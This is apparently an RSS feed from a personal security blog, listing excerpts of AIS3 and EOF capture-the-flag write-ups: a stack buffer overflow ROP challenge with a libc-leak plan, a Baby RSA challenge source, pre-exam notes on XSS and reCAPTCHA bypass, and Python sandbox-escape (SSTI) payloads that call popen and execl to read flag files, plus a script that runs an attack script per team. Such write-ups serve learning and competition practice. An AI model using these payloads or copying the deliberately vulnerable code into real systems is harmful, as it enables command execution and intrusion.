<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>AIS3 :: Tag :: SBK Hugo Site</title><link>https://bernie6401.github.io/tags/ais3/index.html</link><description/><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/ais3/index.xml" rel="self" type="application/rss+xml"/><item><title>AIS3 EOF 2023 初賽</title><link>https://bernie6401.github.io/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/index.html</guid><description>AIS3 EOF 2023 初賽 PWN real_rop Description Challenge URL
Folder structure:
Share ├── share │ ├── chal │ ├── flag │ ├── Makefile │ ├── real_rop++.c │ └── run.sh ├── docker-compose.yaml ├── Dockerfile └── xinetd Original Code #include &lt;unistd.h> int main() { char buf[0x10]; read(0, buf, 0x30); write(1, buf, 0x30); return 0; } gcc -fno-stack-protector -o chal real_rop++.c Obviously buffer overflow but not much Preliminary idea is one_gadget Check protector $ checksec chal [*] '/home/sbk6401/CTF/AIS3/PWN/real_rop/share/chal' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled PIE is enabled → use write function to leak libc address Full RELRO → cannot use GOT hijacking Refer to 大神write up, we cannot leak libc address and get shell at one time. So, we can control $rip and return to the beginning of main function and go through the process again. That is, we have another read function to fill in one_gadget. Note that, the version of Ubuntu and Glibc is VERY VERY important, according to Dockerfile, it seems use Ubuntu 20.04 with default FROM ubuntu:20.04 MAINTAINER u1f383 RUN apt-get update &amp;&amp; \ DEBAIN_FRONTEND=noninteractive apt-get install -qy xinetd RUN useradd -m chal RUN chown -R root:root /home/chal RUN chmod -R 755 /home/chal CMD ["/usr/sbin/xinetd", "-dontfork"] Analyze where to return For Ubuntu 22.04 &amp;　GLIBC 2.35 - back to __libc_start_main+121</description></item><item><title>AIS3 EOF 2024</title><link>https://bernie6401.github.io/security/competition/ais3-eof-2024/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/ais3-eof-2024/index.html</guid><description>AIS3 EOF 2024 Crypto Baby RSA Source Code :::spoiler Source Code
#! /usr/bin/python3 from Crypto.Util.number import bytes_to_long, long_to_bytes, getPrime import os from secret import FLAG def encrypt(m, e, n): enc = pow(bytes_to_long(m), e, n) return enc def decrypt(c, d, n): dec = pow(c, d, n) return long_to_bytes(dec) if __name__ == "__main__": while True: p = getPrime(1024) q = getPrime(1024) n = p * q phi = (p - 1) * (q - 1) e = 3 if phi % e != 0 : d = pow(e, -1, phi) break print(f'{p=}, {q=}') print(f"{n=}, {e=}") print("FLAG: ", encrypt(FLAG, e, n)) for _ in range(3): try: c = int(input("Any message for me?")) m = decrypt(c, d, n) print("How beautiful the message is, it makes me want to destroy it .w.") new_m = long_to_bytes(bytes_to_long(m) ^ bytes_to_long(os.urandom(8))) print( "New Message: ", encrypt(new_m, e, n) ) except: print("?") exit() :::</description></item><item><title>AIS3 Pre-Exam 2023</title><link>https://bernie6401.github.io/security/competition/ais3-pre-exam-2023/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/ais3-pre-exam-2023/index.html</guid><description>AIS3 Pre-Exam 2023 tags: CTF EOF2023 :::spoiler TOC [TOC] :::
Web E-Portfolio baby Recon 直接用Burp Suite可以繞過reCAPTCHA，而且About Guest的內容會被完整的render出來達到XSS
Login Panel Recon 我又找到了一個破解谷歌驗證碼的新方案！ yescaptcha Reverse Pwn Simply Pwn Recon checksec $ checksec pwn [*] Checking for new versions of pwntools To disable this functionality, set the contents of /home/sbk6401/.cache/.pwntools-cache-3.7/update to 'never' (old way). Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide): [update] interval=never [*] You have the latest version of Pwntools (4.9.0) [*] '/home/sbk6401/CTF/AIS3-Pre-Exam/PWN/Simply Pwn/pwn' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Misc Welcome 縮小檔案就看的到flag了 Flag: AIS3{WELCOME-TO-2023-PRE-EXAM-&amp;-MY-FIRST-CTF}</description></item><item><title>EOF AIS3 Final</title><link>https://bernie6401.github.io/security/competition/eof-ais3-final/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/eof-ais3-final/index.html</guid><description>EOF AIS3 Final tags: CTF AIS3 Reference https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/
https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html
https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md
SSTI: https://www.freebuf.com/articles/network/258136.html https://www.compart.com/en/unicode/U+FF5B https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection
Payload:
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", "./flag.txt")) print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']("cat /flag.txt")) file = 'FLAG.TXT' print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", file.lower())) file = 'FLAG.TXT' command = 'EXECL' print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[command.lower()]("/bin/cat", "cat", file.lower())) file = 'FLAG.TXT' print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower())) Script - run_script.py :::spoiler
import subprocess import time import multiprocessing as mp def cycle(i): subprocess.call(['python', 'script.py', '--team', str(i)]) if __name__ == "__main__": p1 = mp.Process(target=cycle, args=('1',)) p2 = mp.Process(target=cycle, args=('2',)) # p3 = mp.Process(target=cycle, args=('3',)) # p4 = mp.Process(target=cycle, args=('4',)) # p5 = mp.Process(target=cycle, args=('5',)) # p7 = mp.Process(target=cycle, args=('7',)) # p8 = mp.Process(target=cycle, args=('8',)) # p9 = mp.Process(target=cycle, args=('9',)) # p10 = mp.Process(target=cycle, args=('10',)) # p11 = mp.Process(target=cycle, args=('11',)) # p12 = mp.Process(target=cycle, args=('12',)) # p13 = mp.Process(target=cycle, args=('13',)) # p14 = mp.Process(target=cycle, args=('14',)) # p15 = mp.Process(target=cycle, args=('15',)) # p16 = mp.Process(target=cycle, args=('16',)) # p17 = mp.Process(target=cycle, args=('17',)) # p18 = mp.Process(target=cycle, args=('18',)) # p19 = mp.Process(target=cycle, args=('19',)) # p20 = mp.Process(target=cycle, args=('20',)) # p21 = mp.Process(target=cycle, args=('21',)) # p22 = mp.Process(target=cycle, args=('22',)) # p23 = mp.Process(target=cycle, args=('23',)) # p24 = mp.Process(target=cycle, args=('24',)) p1.start() time.sleep(2) p2.start() time.sleep(2) # p3.start() # p4.start() # p5.start() # p7.start() # p8.start() # p9.start() # p10.start() # p11.start() # p12.start() # p13.start() # p14.start() # p15.start() # p16.start() # p17.start() # p18.start() # p19.start() # p20.start() # p21.start() # p22.start() # p23.start() # p24.start() p1.join() p2.join() # p3.join() # p4.join() # p5.join() # p7.join() # p8.join() # p9.join() # p10.join() # p11.join() # p12.join() # p13.join() # p14.join() # p15.join() # p16.join() # p17.join() # p18.join() # p19.join() # p20.join() # p21.join() # p22.join() # p23.join() # p24.join() :::</description></item></channel></rss>